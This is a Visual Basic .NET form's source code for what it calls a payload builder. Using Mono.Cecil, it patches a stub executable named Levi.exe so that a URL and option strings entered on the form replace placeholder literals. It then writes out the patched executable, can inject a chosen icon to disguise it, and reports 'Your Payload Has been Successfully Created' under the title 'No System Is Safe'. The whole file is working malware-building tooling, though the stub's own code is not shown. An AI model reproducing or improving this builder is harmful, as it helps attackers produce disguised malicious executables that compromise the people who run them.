Imports System.IO
Imports Mono.Cecil
Imports Mono.Cecil.Cil

Public Class Form1

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Try
            ProgressBar1.Value = 90
            Dim dialog As New SaveFileDialog
            dialog.Filter = "Executable Files (.exe)|*.exe"
            dialog.FileName = "Levi"
            dialog.ShowDialog()
            Dim dit As String = dialog.FileName
            ProgressBar1.Value = 55
            If IO.File.Exists(Application.StartupPath & "\Levi\Levi.exe") Then
            Else
                MsgBox("No Stub File detected in : " & Application.StartupPath)
                ProgressBar1.Value = 0
                Exit Sub
            End If
            ProgressBar1.Value = 99
            Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\Levi\Levi.exe"))
            Dim definition2 As TypeDefinition
            For Each definition2 In definition.MainModule.GetTypes
                Dim definition3 As MethodDefinition
                For Each definition3 In definition2.Methods
                    If (definition3.Name = ".ctor") Then
                        Dim enumerator As IEnumerator(Of Instruction) = Nothing
                        Try
                            enumerator = definition3.Body.Instructions.GetEnumerator
                            Do While enumerator.MoveNext
                                Dim current As Instruction = enumerator.Current
                                If (current.OpCode.Code = Code.Ldstr) Then
                                    Dim str As String = current.Operand.ToString
                                    ProgressBar1.Value = 0
                                    If (str = "URL") Then
                                        Dim vN As TextBox = Me.URL
                                        Dim text As String = vN.Text
                                        vN.Text = text
                                        current.Operand = ([text])
                                        ProgressBar1.Value = 99
                                    Else
                                        ProgressBar1.Value = 0
                                        If (str = "L") Then

                                            If L.Enabled = False Then
                                                current.Operand = "L"
                                            Else

                                                current.Operand = L.Text
                                            End If
                                            ProgressBar1.Value = 99
                                            Continue Do
                                        End If
                                        ProgressBar1.Value = 0
                                        If (str = "Browser") Then
                                            If START.Enabled = False Then
                                                current.Operand = "NOT!"
                                            Else
                                                current.Operand = START.Text
                                            End If
                                            ProgressBar1.Value = 99
                                            Continue Do
                                        End If
                                        ProgressBar1.Value = 0
                                    End If
                                End If
                            Loop
                        Finally
                            enumerator.Dispose()
                        End Try
                    End If
                Next
            Next
            definition.Write(dialog.FileName)
            If CheckBox1.Checked Then
                IconN.InjectIcon(dialog.FileName, Me.string_0)
            End If
            Dim ptr As IntPtr = GClass2.BeginUpdateResource(dialog.FileName, False)
            Dim buffer As Byte() = File.ReadAllBytes((Application.StartupPath & "\Stub.manifest"))
            GClass2.UpdateResource(ptr, CType(24, IntPtr), CType(1, IntPtr), 0, buffer, buffer.Length)
            GClass2.EndUpdateResource(ptr, False)
            ProgressBar1.Value = 100
            MsgBox("Your Payload Has been Successfully Created", MsgBoxStyle.Information, "No System Is Safe")
            ProgressBar1.Value = 0
        Catch ex1 As Exception
            MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
            Return
        End Try
    End Sub
    Public string_0 As String
    Private Sub CheckBox3_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox3.CheckedChanged
        If Me.CheckBox3.Checked Then
            If (Me.PictureBox1.Image Is Nothing) Then
                Dim dialog As New OpenFileDialog With {
                    .Filter = "Icon|*.ico",
                    .Title = "Choose Icon",
                    .FileName = String.Empty
                }
                If (dialog.ShowDialog = DialogResult.OK) Then
                    Me.string_0 = dialog.FileName
                    Me.PictureBox1.Image = Image.FromFile(Me.string_0)
                End If
            End If
        Else
            Me.PictureBox1.Image = Nothing
        End If
    End Sub

    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If L.Enabled = False Then
            L.Enabled = True
            Label2.ForeColor = Color.Red
        Else
            L.Enabled = False
            Label2.ForeColor = Color.Black
        End If
    End Sub
    Private Sub CheckBox2_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox2.CheckedChanged
        If START.Enabled = False Then
            START.Enabled = True
        Else
            START.Enabled = False
        End If
    End Sub
End Class
